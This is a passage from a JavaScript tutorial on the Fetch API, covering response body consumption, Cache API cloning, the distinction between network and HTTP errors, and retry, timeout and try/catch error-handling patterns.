```

#### When Cloning is Necessary

```javascript
// Necessary cloning - original needs to be preserved
async function cacheAndReturn(response) {
  const clone = response.clone();
  
  // Cache the clone
  caches.open('api-cache').then(cache => {
    cache.put(response.url, clone);
  });
  
  // Return original for immediate use
  return response;
}
```

### Integration with Cache API

The Cache API respects the body used flag when storing and retrieving responses.

```javascript
// Storing in cache
const response = await fetch('https://api.example.com/data');
const cache = await caches.open('my-cache');

// Must clone before caching if you want to use the response
const cacheClone = response.clone();
await cache.put('https://api.example.com/data', cacheClone);

// Original response still usable
const data = await response.json();
```

```javascript
// Retrieving from cache
const cache = await caches.open('my-cache');
const cachedResponse = await cache.match('https://api.example.com/data');

if (cachedResponse) {
  console.log(cachedResponse.bodyUsed); // false
  const data = await cachedResponse.json();
  console.log(cachedResponse.bodyUsed); // true
  
  // Cannot read again from cache without new match
  const freshCopy = await cache.match('https://api.example.com/data');
  const dataAgain = await freshCopy.json(); // Works - new response object
}
```

### Testing Body Consumption

```javascript
// Test helper to verify body hasn't been consumed
function assertBodyNotUsed(response, message) {
  if (response.bodyUsed) {
    throw new Error(message || 'Expected body to not be used, but it was');
  }
}

// Usage in tests
const response = await fetch('https://api.example.com/data');
assertBodyNotUsed(response, 'Body should not be consumed before processing');

await someFunction(response);
assertBodyNotUsed(response, 'someFunction should not consume the body');
```

### Type Guards and Body Used

```javascript
async function safelyReadResponse(response) {
  // Type guard pattern
  if (!response || response.bodyUsed) {
    return null;
  }
  
  try {
    const contentType = response.headers.get('Content-Type');
    
    if (contentType?.includes('application/json')) {
      return await response.json();
    }
    
    if (contentType?.includes('text/')) {
      return await response.text();
    }
    
    return await response.blob();
  } catch (error) {
    console.error('Failed to read response:', error);
    return null;
  }
}
```

### Documenting Body Consumption in APIs

When creating functions that accept responses, clearly document whether they consume the body.

```javascript
/**
 * Validates response status and headers.
 * Does NOT consume the response body.
 * 
 * @param {Response} response - The fetch response
 * @returns {boolean} - Whether the response is valid
 */
function validateResponseHeaders(response) {
  return response.ok && 
         response.headers.get('Content-Type')?.includes('json');
}

/**
 * Extracts and validates JSON data from response.
 * CONSUMES the response body.
 * 
 * @param {Response} response - The fetch response
 * @returns {Promise<Object>} - Parsed JSON data
 */
async function extractAndValidateJSON(response) {
  const data = await response.json(); // Body consumed here
  
  if (!data || typeof data !== 'object') {
    throw new Error('Invalid JSON structure');
  }
  
  return data;
}
```

---

# Error Handling

## Network Errors vs HTTP Errors

Network errors and HTTP errors represent fundamentally different failure modes in the Fetch API, each with distinct characteristics, handling requirements, and implications for application behavior.

## Fundamental Distinction

### Network Errors

Network errors occur when the HTTP request cannot be completed at the network level. The Fetch API **rejects the promise** when network errors occur:

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // This block never executes on network error
  })
  .catch(error => {
    // Network errors land here
    console.error('Network error:', error);
  });
```

### HTTP Errors

HTTP errors occur when the server successfully responds but returns an error status code (4xx, 5xx). The Fetch API **resolves the promise** with a Response object:

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // This executes even for 404, 500, etc.
    console.log(response.status); // 404, 500, etc.
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    return response.json();
  })
  .catch(error => {
    // Only explicit throws or network errors land here
  });
```

## Network Error Scenarios

### Connection Failures

```javascript
// Server unreachable, DNS failure, no internet connection
fetch('https://nonexistent-domain-12345.com/api')
  .catch(error => {
    console.error(error.message); // "Failed to fetch" or similar
  });
```

### CORS Violations

```javascript
// Cross-origin request blocked by CORS policy
fetch('https://api.different-origin.com/data')
  .catch(error => {
    // CORS violations manifest as network errors
    console.error('CORS error:', error);
  });
```

### Request Timeout

```javascript
// AbortController triggers network error
const controller = new AbortController();
setTimeout(() => controller.abort(), 5000);

fetch('https://slow-api.com/data', { signal: controller.signal })
  .catch(error => {
    if (error.name === 'AbortError') {
      console.error('Request timed out');
    }
  });
```

### TLS/SSL Certificate Issues

```javascript
// Invalid or expired SSL certificates
fetch('https://expired-cert.example.com/data')
  .catch(error => {
    // Certificate errors appear as network errors
    console.error('Certificate error:', error);
  });
```

### Network Stack Failures

- Protocol errors
- Connection reset by peer
- Network interface down
- Proxy configuration issues
- Firewall blocking

## HTTP Error Scenarios

### Client Errors (4xx)

```javascript
fetch('https://api.example.com/users/99999')
  .then(response => {
    console.log(response.status); // 404
    console.log(response.ok); // false
    console.log(response.statusText); // "Not Found"
    
    // Still have full access to response
    return response.json(); // May contain error details
  })
  .then(errorBody => {
    console.log(errorBody); // { error: "User not found" }
  });
```

Common 4xx codes:

- **400 Bad Request**: Malformed request syntax
- **401 Unauthorized**: Authentication required
- **403 Forbidden**: Authenticated but insufficient permissions
- **404 Not Found**: Resource doesn't exist
- **405 Method Not Allowed**: Wrong HTTP method
- **409 Conflict**: Request conflicts with server state
- **422 Unprocessable Entity**: Valid syntax but semantic errors
- **429 Too Many Requests**: Rate limit exceeded

### Server Errors (5xx)

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    console.log(response.status); // 500, 502, 503, etc.
    console.log(response.ok); // false
    
    // Response object fully accessible
    return response.text(); // May contain error page HTML
  });
```

Common 5xx codes:

- **500 Internal Server Error**: Generic server failure
- **502 Bad Gateway**: Invalid response from upstream server
- **503 Service Unavailable**: Server temporarily unavailable
- **504 Gateway Timeout**: Upstream server timeout
- **507 Insufficient Storage**: Server out of space

## Response Object Characteristics

### Network Error: No Response Object

```javascript
fetch(url)
  .then(response => {
    // Never reaches here on network error
  })
  .catch(error => {
    console.log(error.message); // Error message
    console.log(response); // ReferenceError: response is not defined
  });
```

### HTTP Error: Valid Response Object

```javascript
fetch(url)
  .then(response => {
    console.log(response.status); // 404, 500, etc.
    console.log(response.headers); // Headers object available
    console.log(response.type); // "basic", "cors", etc.
    console.log(response.ok); // false for errors
    console.log(response.body); // ReadableStream available
    
    // Can read response body
    return response.json();
  });
```

## The `response.ok` Property

The `ok` property is only relevant for HTTP errors, as it doesn't exist during network errors:

```javascript
fetch(url)
  .then(response => {
    // response.ok is true for status 200-299
    // response.ok is false for status <200 or ≥300
    
    if (!response.ok) {
      // This is an HTTP error
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return response.json();
  })
  .catch(error => {
    // Catches both:
    // 1. Network errors (promise rejection)
    // 2. HTTP errors (explicitly thrown above)
  });
```

## Error Detection Patterns

### Basic Pattern

```javascript
async function fetchData(url) {
  try {
    const response = await fetch(url);
    
    // Check for HTTP errors
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    // Handles both network and HTTP errors
    console.error('Request failed:', error);
    throw error;
  }
}
```

### Distinguishing Error Types

```javascript
async function fetchWithErrorType(url) {
  let response;
  
  try {
    response = await fetch(url);
  } catch (error) {
    // Definitely a network error
    console.error('Network error:', error.message);
    throw { type: 'network', originalError: error };
  }
  
  // If we reach here, we have a response
  if (!response.ok) {
    // HTTP error
    const errorBody = await response.text();
    throw {
      type: 'http',
      status: response.status,
      statusText: response.statusText,
      body: errorBody
    };
  }
  
  return await response.json();
}
```

### Comprehensive Error Handler

```javascript
async function robustFetch(url, options = {}) {
  let response;
  let networkError = false;
  
  try {
    response = await fetch(url, options);
  } catch (error) {
    networkError = true;
    
    // Classify network error
    if (error.name === 'AbortError') {
      throw {
        type: 'abort',
        message: 'Request was aborted',
        retryable: false
      };
    }
    
    if (error.message.includes('CORS')) {
      throw {
        type: 'cors',
        message: 'CORS policy violation',
        retryable: false
      };
    }
    
    throw {
      type: 'network',
      message: error.message,
      retryable: true,
      originalError: error
    };
  }
  
  // HTTP error handling
  if (!response.ok) {
    const contentType = response.headers.get('content-type');
    let errorBody;
    
    if (contentType?.includes('application/json')) {
      errorBody = await response.json();
    } else {
      errorBody = await response.text();
    }
    
    throw {
      type: 'http',
      status: response.status,
      statusText: response.statusText,
      body: errorBody,
      retryable: response.status >= 500 || response.status === 429,
      headers: Object.fromEntries(response.headers.entries())
    };
  }
  
  return response;
}
```

## Retry Logic Implications

### Network Errors: Generally Retryable

```javascript
async function fetchWithNetworkRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      const isLastAttempt = i === maxRetries - 1;
      
      // Check if it's a network error (no response object exists)
      const isNetworkError = !error.message.startsWith('HTTP');
      
      if (isNetworkError && !isLastAttempt) {
        const delay = Math.pow(2, i) * 1000; // Exponential backoff
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      
      throw error;
    }
  }
}
```

### HTTP Errors: Selectively Retryable

```javascript
async function fetchWithSmartRetry(url, maxRetries = 3) {
  const retryableStatuses = new Set([408, 429, 500, 502, 503, 504]);
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      
      if (!response.ok) {
        // Some HTTP errors should not be retried
        if (!retryableStatuses.has(response.status)) {
          throw new Error(`HTTP ${response.status}: Not retryable`);
        }
        
        // Handle rate limiting
        if (response.status === 429) {
          const retryAfter = response.headers.get('Retry-After');
          const delay = retryAfter ? parseInt(retryAfter) * 1000 : 60000;
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
        
        // Retry server errors
        if (i < maxRetries - 1) {
          const delay = Math.pow(2, i) * 1000;
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
        
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      // Network errors are always retried
      if (i < maxRetries - 1 && !error.message.startsWith('HTTP')) {
        const delay = Math.pow(2, i) * 1000;
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      
      throw error;
    }
  }
}
```

## Error Response Body Access

### Network Errors: No Body

```javascript
fetch(url)
  .catch(error => {
    // No response object exists
    console.log(error.message); // Generic error message
    // Cannot access: status, headers, body
  });
```

### HTTP Errors: Body Available

```javascript
fetch(url)
  .then(async response => {
    if (!response.ok) {
      // Can read error details from server
      const errorData = await response.json();
      
      console.log(errorData);
      // {
      //   error: "Validation failed",
      //   fields: { email: "Invalid format" }
      // }
      
      throw new Error(errorData.error);
    }
  });
```

## User Experience Implications

### Network Error Messages

Network errors provide limited information to users:

```javascript
fetch(url)
  .catch(error => {
    // Generic messages like:
    // - "Failed to fetch"
    // - "Network request failed"
    // - "TypeError: NetworkError when attempting to fetch resource"
    
    // User-friendly handling
    displayError('Unable to connect. Please check your internet connection.');
  });
```

### HTTP Error Messages

HTTP errors allow detailed user feedback:

```javascript
fetch(url)
  .then(async response => {
    if (!response.ok) {
      const errorData = await response.json();
      
      switch (response.status) {
        case 400:
          displayError(`Invalid request: ${errorData.message}`);
          break;
        case 401:
          displayError('Please log in to continue');
          redirectToLogin();
          break;
        case 403:
          displayError('You don\'t have permission to access this resource');
          break;
        case 404:
          displayError('The requested resource was not found');
          break;
        case 429:
          displayError('Too many requests. Please try again later');
          break;
        case 500:
          displayError('Server error. Our team has been notified');
          break;
        default:
          displayError(`An error occurred: ${response.statusText}`);
      }
    }
  });
```

## Logging and Monitoring

### Network Error Logging

```javascript
async function fetchWithLogging(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      // Log HTTP errors with full context
      logger.error('HTTP error', {
        url,
        status: response.status,
        statusText: response.statusText,
        headers: Object.fromEntries(response.headers.entries()),
        timestamp: new Date().toISOString()
      });
    }
    
    return response;
  } catch (error) {
    // Log network errors with available information
    logger.error('Network error', {
      url,
      errorMessage: error.message,
      errorName: error.name,
      stack: error.stack,
      timestamp: new Date().toISOString()
    });
    
    throw error;
  }
}
```

## Testing Considerations

### Simulating Network Errors

```javascript
// Using Service Workers or network mocking libraries
async function simulateNetworkError() {
  // Mock fetch to reject promise
  global.fetch = jest.fn(() => 
    Promise.reject(new TypeError('Failed to fetch'))
  );
  
  await expect(fetchData('/api/data'))
    .rejects
    .toThrow('Failed to fetch');
}
```

### Simulating HTTP Errors

```javascript
async function simulateHTTPError() {
  // Mock fetch to resolve with error status
  global.fetch = jest.fn(() =>
    Promise.resolve({
      ok: false,
      status: 404,
      statusText: 'Not Found',
      json: () => Promise.resolve({ error: 'Resource not found' })
    })
  );
  
  const response = await fetch('/api/data');
  expect(response.ok).toBe(false);
  expect(response.status).toBe(404);
}
```

## Security Implications

### Network Errors Hide Details

CORS violations appear as generic network errors, preventing information leakage:

```javascript
// Blocked by CORS
fetch('https://api.internal-company.com/sensitive-data')
  .catch(error => {
    // Error message is generic, doesn't reveal:
    // - Whether the resource exists
    // - What the actual response was
    // - Server configuration details
    console.error(error.message); // "Failed to fetch"
  });
```

### HTTP Errors Expose Information

HTTP errors reveal that the endpoint exists and how it responded:

```javascript
fetch('https://api.example.com/sensitive-data')
  .then(response => {
    if (response.status === 401) {
      // Confirms: endpoint exists, requires auth
    }
    if (response.status === 403) {
      // Confirms: endpoint exists, user lacks permission
    }
    if (response.status === 404) {
      // Confirms: endpoint doesn't exist (or pretends not to)
    }
  });
```

## Common Misconceptions

### Misconception: All Fetch Failures Are Network Errors

**Reality**: HTTP error responses (4xx, 5xx) resolve the promise successfully.

### Misconception: `response.ok` Exists for All Errors

**Reality**: Network errors reject the promise before a Response object is created.

### Misconception: Network Errors Always Mean "No Internet"

**Reality**: CORS violations, SSL errors, timeouts, and DNS failures all manifest as network errors.

### Misconception: HTTP 404 Throws an Error

**Reality**: 404 returns a valid Response object with `ok: false` and `status: 404`.

---

## Try-Catch Patterns with fetch()

The fetch API requires careful error handling because it only rejects on network failures, not HTTP error status codes. Understanding comprehensive try-catch patterns is essential for robust applications.

### Basic Network Error Handling

The fetch promise only rejects for network-level failures (no internet connection, DNS lookup failure, request blocked by browser, etc.). HTTP error statuses like 404 or 500 return resolved promises.

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  console.log('Request succeeded');
} catch (error) {
  // Only catches network failures, not HTTP errors
  console.error('Network error:', error.message);
}
```

### HTTP Status Error Handling

Since fetch doesn't reject on HTTP errors, you must explicitly check `response.ok` or `response.status`:

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
} catch (error) {
  // Catches both network errors and thrown HTTP errors
  console.error('Request failed:', error.message);
}
```

### Parsing Error Handling

JSON parsing can fail if the response body isn't valid JSON. This requires separate error handling:

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  try {
    const data = await response.json();
    return data;
  } catch (parseError) {
    throw new Error(`JSON parse error: ${parseError.message}`);
  }
} catch (error) {
  console.error('Request failed:', error.message);
}
```

### Comprehensive Pattern with Error Types

Distinguish between different error categories for appropriate handling:

```javascript
async function fetchData(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      const error = new Error(`HTTP ${response.status}`);
      error.status = response.status;
      error.response = response;
      throw error;
    }
    
    try {
      return await response.json();
    } catch (parseError) {
      const error = new Error('Invalid JSON response');
      error.cause = parseError;
      error.originalError = parseError;
      throw error;
    }
  } catch (error) {
    if (error.name === 'TypeError' && !error.status) {
      // Network-level error
      throw new Error(`Network error: ${error.message}`);
    }
    throw error; // Re-throw HTTP or parse errors
  }
}
```

### Timeout Pattern

fetch doesn't have built-in timeout support. Combine with AbortController:

```javascript
async function fetchWithTimeout(url, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}
```

### Retry Pattern with Exponential Backoff

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        // Don't retry client errors (4xx), only server errors (5xx)
        if (response.status >= 400 && response.status < 500) {
          throw new Error(`Client error: ${response.status}`);
        }
        throw new Error(`Server error: ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      lastError = error;
      
      // Don't retry on client errors
      if (error.message.includes('Client error')) {
        throw error;
      }
      
      if (attempt < maxRetries) {
        const delay = Math.pow(2, attempt) * 1000; // Exponential backoff
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw new Error(`Failed after ${maxRetries} retries: ${lastError.message}`);
}
```

### Graceful Degradation Pattern

Handle errors with fallback responses:

```javascript
async function fetchWithFallback(url, fallbackData) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      console.warn(`HTTP ${response.status}, using fallback`);
      return fallbackData;
    }
    
    try {
      return await response.json();
    } catch (parseError) {
      console.warn('Parse error, using fallback');
      return fallbackData;
    }
  } catch (networkError) {
    console.warn('Network error, using fallback');
    return fallbackData;
  }
}
```

### Error Context Enrichment

Add contextual information to errors for better debugging:

```javascript
async function fetchWithContext(url, options = {}) {
  const requestId = crypto.randomUUID();
  const startTime = Date.now();
  
  try {
    const response = await fetch(url, options);
    const duration = Date.now() - startTime;
    
    if (!response.ok) {
      const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
      error.context = {
        requestId,
        url,
        method: options.method || 'GET',
        status: response.status,
        duration,
        headers: Object.fromEntries(response.headers.entries())
      };
      throw error;
    }
    
    return await response.json();
  } catch (error) {
    if (!error.context) {
      error.context = {
        requestId,
        url,
        method: options.method || 'GET',
        duration: Date.now() - startTime
      };
    }
    throw error;
  }
}
```

### Parallel Requests Error Handling

Handle errors when fetching multiple resources simultaneously:

```javascript
async function fetchMultiple(urls) {
  const results = await Promise.allSettled(
    urls.map(async url => {
      try {
        const response = await fetch(url);
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }
        return await response.json();
      } catch (error) {
        return { error: error.message, url };
      }
    })
  );
  
  const succeeded = results
    .filter(r => r.status === 'fulfilled' && !r.value.error)
    .map(r => r.value);
    
  const failed = results
    .filter(r => r.status === 'rejected' || r.value?.error)
    .map(r => r.reason || r.value);
  
  return { succeeded, failed };
}
```

### Custom Error Classes

Create specific error types for different failure scenarios:

```javascript
class FetchError extends Error {
  constructor(message, status, response) {
    super(message);
    this.name = 'FetchError';
    this.status = status;
    this.response = response;
  }
}

class NetworkError extends Error {
  constructor(message, originalError) {
    super(message);
    this.name = 'NetworkError';
    this.originalError = originalError;
  }
}

class ParseError extends Error {
  constructor(message, originalError) {
    super(message);
    this.name = 'ParseError';
    this.originalError = originalError;
  }
}

async function fetchTyped(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new FetchError(
        `Request failed with status ${response.status}`,
        response.status,
        response
      );
    }
    
    try {
      return await response.json();
    } catch (parseError) {
      throw new ParseError('Failed to parse JSON', parseError);
    }
  } catch (error) {
    if (error instanceof FetchError || error instanceof ParseError) {
      throw error;
    }
    throw new NetworkError('Network request failed', error);
  }
}

// Usage with specific handling
try {
  await fetchTyped('https://api.example.com/data');
} catch (error) {
  if (error instanceof FetchError) {
    console.error('HTTP error:', error.status);
  } else if (error instanceof NetworkError) {
    console.error('Network failure:', error.message);
  } else if (error instanceof ParseError) {
    console.error('Invalid response format');
  }
}
```

### AbortController Error Handling

Properly handle cancellation errors:

```javascript
async function fetchCancellable(url, controller) {
  try {
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    if (error.name === 'AbortError') {
      console.log('Request was cancelled');
      return null; // Or handle cancellation differently
    }
    throw error; // Re-throw other errors
  }
}
```

### Finally Block Usage

Ensure cleanup always occurs:

```javascript
async function fetchWithCleanup(url) {
  let controller;
  
  try {
    controller = new AbortController();
    
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Request failed:', error.message);
    throw error;
  } finally {
    // Cleanup always runs
    controller = null;
    console.log('Request cleanup completed');
  }
}
```

### Error Boundary Pattern for UI

Centralized error handling for UI applications:

```javascript
class FetchService {
  constructor(onError) {
    this.onError = onError;
  }
  
  async fetch(url, options = {}) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        const error = new Error(`HTTP ${response.status}`);
        error.status = response.status;
        throw error;
      }
      
      return await response.json();
    } catch (error) {
      // Centralized error handling
      this.onError(error, url);
      throw error;
    }
  }
}

// Usage
const service = new FetchService((error, url) => {
  // Log to monitoring service
  console.error('Fetch error:', { error: error.message, url });
  
  // Show user notification
  if (error.status >= 500) {
    showNotification('Server error, please try again');
  } else if (error.name === 'NetworkError') {
    showNotification('Connection problem, check your network');
  }
});
```

---

## Promise Rejection Handling in Fetch API

The Fetch API returns a Promise, and understanding when and why it rejects is critical for robust error handling. Unlike traditional HTTP libraries, Fetch has specific rejection behavior that differs from common expectations.

### When Fetch Rejects

The Fetch Promise **only rejects** in these scenarios:

1. **Network failures** - Cannot reach the server at all
2. **CORS violations** - Cross-origin request blocked by browser
3. **Request abortion** - Request cancelled via AbortController
4. **Invalid schemes** - Using unsupported URL schemes
5. **Browser security policies** - Content Security Policy or mixed content blocks

### When Fetch Does NOT Reject

Critically, Fetch **does not reject** for HTTP error status codes:

```javascript
// This will NOT reject even though 404 is an error
const response = await fetch('https://example.com/nonexistent');
console.log(response.status); // 404
console.log(response.ok); // false
// No rejection occurred - promise resolved successfully
```

HTTP status codes like 400, 404, 500, 503, etc. result in a **resolved Promise** with `response.ok` set to `false`.

### Basic Error Handling Pattern

```javascript
try {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
} catch (error) {
  // Handles network errors AND manually thrown HTTP errors
  console.error('Fetch failed:', error);
}
```

### Network Failure Handling

Network failures trigger Promise rejection:

```javascript
async function fetchWithNetworkErrorHandling(url) {
  try {
    const response = await fetch(url);
    return response;
  } catch (error) {
    // Network-level failures land here
    console.error('Network error:', error.message);
    
    // [Inference] Common network error messages include:
    // - "Failed to fetch" (generic network failure)
    // - "NetworkError when attempting to fetch resource"
    // - "Load failed" (iOS Safari)
    
    throw error;
  }
}
```

### CORS Rejection

CORS violations cause Promise rejection:

```javascript
async function fetchCrossOrigin(url) {
  try {
    const response = await fetch(url);
    return await response.json();
  } catch (error) {
    // CORS errors appear here
    if (error.message.includes('CORS') || 
        error.message.includes('fetch')) {
      console.error('CORS policy blocked request');
      console.error('Server must include proper CORS headers');
    }
    throw error;
  }
}
```

[Inference] CORS errors typically show messages like "Failed to fetch" or reference CORS policies, but the exact message varies by browser.

### Abort Signal Rejection

Aborted requests trigger rejection with an `AbortError`:

```javascript
async function fetchWithTimeout(url, timeoutMs = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      console.error('Request aborted or timed out');
      throw new Error('Request timeout');
    }
    
    throw error;
  }
}
```

### Comprehensive Error Classification

Distinguish between different error types:

```javascript
async function fetchWithDetailedErrors(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      // HTTP error - not a rejection
      const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
      error.response = response;
      error.status = response.status;
      throw error;
    }
    
    return await response.json();
  } catch (error) {
    // Classify the error type
    if (error.name === 'AbortError') {
      console.error('Request was aborted');
      error.errorType = 'ABORT';
    } else if (error.response) {
      console.error('HTTP error:', error.status);
      error.errorType = 'HTTP';
    } else if (error.message.includes('Failed to fetch') || 
               error.message.includes('NetworkError')) {
      console.error('Network failure');
      error.errorType = 'NETWORK';
    } else if (error instanceof TypeError) {
      console.error('Type error - possibly CORS or invalid URL');
      error.errorType = 'TYPE';
    } else if (error instanceof SyntaxError) {
      console.error('JSON parsing error');
      error.errorType = 'PARSE';
    } else {
      console.error('Unknown error');
      error.errorType = 'UNKNOWN';
    }
    
    throw error;
  }
}
```

### HTTP Status Code Handling

Create explicit handlers for different status ranges:

```javascript
async function fetchWithStatusHandling(url) {
  try {
    const response = await fetch(url);
    
    // Handle specific status codes
    if (response.status === 401) {
      throw new Error('Authentication required');
    }
    
    if (response.status === 403) {
      throw new Error('Access forbidden');
    }
    
    if (response.status === 404) {
      throw new Error('Resource not found');
    }
    
    if (response.status >= 500) {
      throw new Error('Server error - please retry later');
    }
    
    if (!response.ok) {
      throw new Error(`Request failed: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Request error:', error.message);
    throw error;
  }
}
```

### Parsing Errors

JSON parsing can fail after successful fetch:

```javascript
async function fetchJSON(url) {
  let response;
  
  try {
    response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    // Parsing happens AFTER successful fetch
    const data = await response.json();
    return data;
  } catch (error) {
    if (error instanceof SyntaxError) {
      console.error('Invalid JSON response');
      // [Inference] Response was successful but body wasn't valid JSON
      if (response) {
        const text = await response.text();
        console.error('Response body:', text.substring(0, 200));
      }
    }
    throw error;
  }
}
```

### Retry Logic with Exponential Backoff

Handle transient failures with retry mechanism:

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const response = await fetch(url, options);
      
      // Don't retry on client errors (4xx)
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      if (!response.ok) {
        // Retry on server errors (5xx)
        throw new Error(`Server error: ${response.status}`);
      }
      
      return response;
    } catch (error) {
      lastError = error;
      
      // Don't retry on abort errors
      if (error.name === 'AbortError') {
        throw error;
      }
      
      if (attempt < maxRetries) {
        // Exponential backoff: 1s, 2s, 4s
        const delay = Math.pow(2, attempt) * 1000;
        console.log(`Retry ${attempt + 1}/${maxRetries} after ${delay}ms`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw new Error(`Failed after ${maxRetries} retries: ${lastError.message}`);
}
```

### Unhandled Rejection Protection

Prevent unhandled promise rejections:

```javascript
// Global handler for unhandled rejections
window.addEventListener('unhandledrejection', event => {
  console.error('Unhandled promise rejection:', event.reason);
  
  // [Inference] Check if it's a fetch-related error
  if (event.reason?.message?.includes('fetch') || 
      event.reason?.message?.includes('Failed to fetch')) {
    console.error('Unhandled fetch error detected');
    // Log to error tracking service, show user notification, etc.
  }
  
  // Prevent default browser handling
  event.preventDefault();
});

// Always handle fetch promises
fetch(url)
  .then(response => response.json())
  .catch(error => console.error('Fetch error:', error));
```

### Async/Await vs Promise Chain

Both patterns work, but async/await provides clearer error handling:

```javascript
// Promise chain approach
function fetchDataPromiseChain(url) {
  return fetch(url)
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      return response.json();
    })
    .catch(error => {
      console.error('Error:', error);
      throw error;
    });
}

// Async/await approach (recommended)
async function fetchDataAsyncAwait(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
```

### Error Recovery Strategies

Implement fallback mechanisms:

```javascript
async function fetchWithFallback(primaryUrl, fallbackUrl) {
  try {
    return await fetch(primaryUrl);
  } catch (primaryError) {
    console.warn('Primary endpoint failed, trying fallback');
    
    try {
      return await fetch(fallbackUrl);
    } catch (fallbackError) {
      console.error('Both endpoints failed');
      throw new Error('All endpoints unavailable');
    }
  }
}
```

### Response Error Details

Extract detailed error information from response:

```javascript
async function fetchWithErrorDetails(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      // Try to get error details from response body
      let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
      
      try {
        const errorData = await response.json();
        if (errorData.message) {
          errorMessage = errorData.message;
        }
        if (errorData.errors) {
          errorMessage += `\nDetails: ${JSON.stringify(errorData.errors)}`;
        }
      } catch (parseError) {
        // Response body wasn't JSON, try text
        try {
          const errorText = await response.text();
          if (errorText) {
            errorMessage += `\n${errorText.substring(0, 200)}`;
          }
        } catch (textError) {
          // Unable to read response body
        }
      }
      
      const error = new Error(errorMessage);
      error.status = response.status;
      error.response = response;
      throw error;
    }
    
    return await response.json();
  } catch (error) {
    if (error.response) {
      // HTTP error with details
      console.error('HTTP Error:', error.message);
    } else {
      // Network error
      console.error('Network Error:', error.message);
    }
    throw error;
  }
}
```

### Timeout Implementation

Implement request timeouts using AbortController:

```javascript
async function fetchWithAbortTimeout(url, timeoutMs = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeoutMs}ms`);
    }
    
    throw error;
  }
}
```

### Multiple Concurrent Requests

Handle rejection in parallel requests:

```javascript
async function fetchMultipleWithErrors(urls) {
  const results = await Promise.allSettled(
    urls.map(url => fetch(url).then(r => {
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      return r.json();
    }))
  );
  
  const successful = [];
  const failed = [];
  
  results.forEach((result, index) => {
